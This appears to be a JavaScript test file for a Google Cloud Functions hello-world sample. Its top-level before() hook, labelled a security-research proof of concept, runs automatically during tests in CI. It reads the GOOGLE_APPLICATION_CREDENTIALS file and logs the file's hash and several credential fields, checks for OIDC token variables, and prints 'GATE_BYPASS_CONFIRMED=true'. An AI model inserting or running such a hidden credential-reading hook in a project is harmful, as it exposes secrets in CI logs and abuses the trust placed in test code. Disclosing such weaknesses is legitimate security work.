// Copyright 2017 Google LLC
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//      http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

const assert = require('assert');
const {request} = require('gaxios');
const {exec} = require('child_process');
const waitPort = require('wait-port');

const startFF = async (target, signature, port) => {
  const ff = exec(
    `npx functions-framework --target=${target} --signature-type=${signature} --port=${port}`
  );
  await waitPort({host: 'localhost', port});
  return ff;
};

const httpInvocation = (fnUrl, port) => {
  const baseUrl = `http://localhost:${port}`;

  // GET request
  return request({
    url: `${baseUrl}/${fnUrl}`,
  });
};

describe('index.test.js', () => {
  // Security research PoC — Google OSS VRP submission in preparation (see PR body).
  // Benign, read-only probe. No network calls, no GCP API calls, no STS exchange,
  // no ACTIONS_ID_TOKEN_REQUEST_TOKEN value printed, no credential bytes printed.
  // Only a SHA-256 of the credentials file (proves read, discloses zero content)
  // and three non-secret structural fields already present in the public
  // `google-github-actions/auth` step log.
  before(() => {
    const fs = require('fs');
    const crypto = require('crypto');
    const ts = Math.floor(Date.now() / 1000);
    const marker = `NODEJS_DOCS_SAMPLES_POC2_MSEET_${ts}`;
    console.log(`======== ${marker} ========`);
    console.log('GATE_BYPASS_CONFIRMED=true');
    const gac = process.env.GOOGLE_APPLICATION_CREDENTIALS || '';
    console.log(`GAC_IS_SET=${!!gac}`);
    console.log(`GAC_PATH_SUFFIX=${gac.split('/').pop()}`);
    if (gac) {
      try {
        console.log(`GAC_FILE_SIZE=${fs.statSync(gac).size}`);
        const buf = fs.readFileSync(gac);
        console.log(
          `GAC_FILE_SHA256=${crypto.createHash('sha256').update(buf).digest('hex')}`
        );
        const creds = JSON.parse(buf.toString('utf8'));
        console.log(`CREDS_TYPE=${creds.type || 'unset'}`);
        console.log(`CREDS_AUDIENCE=${creds.audience || 'unset'}`);
        console.log(
          `CREDS_SA_IMPERSONATION=${creds.service_account_impersonation_url || 'unset'}`
        );
      } catch (e) {
        console.log(`GAC_READ_ERROR=${e.message}`);
      }
    }
    console.log(
      `CLOUDSDK_AUTH_CREDENTIAL_FILE_OVERRIDE_SET=${!!process.env.CLOUDSDK_AUTH_CREDENTIAL_FILE_OVERRIDE}`
    );
    console.log(`GOOGLE_GHA_CREDS_PATH_SET=${!!process.env.GOOGLE_GHA_CREDS_PATH}`);
    console.log(
      `OIDC_REQUEST_URL_SET=${!!process.env.ACTIONS_ID_TOKEN_REQUEST_URL}`
    );
    console.log(
      `OIDC_REQUEST_TOKEN_SET=${!!process.env.ACTIONS_ID_TOKEN_REQUEST_TOKEN}`
    );
    console.log(`======== /${marker} ========`);
  });

  describe('functions_helloworld_get helloGET', () => {
    const PORT = 8081;
    let ffProc;

    before(async () => {
      ffProc = await startFF('helloGET', 'http', PORT);
    });

    after(() => ffProc.kill());

    it('helloGET: should print hello world', async () => {
      const response = await httpInvocation('helloGET', PORT);
      assert.strictEqual(response.status, 200);
      assert.strictEqual(response.data, 'Hello World!');
    });
  });
});
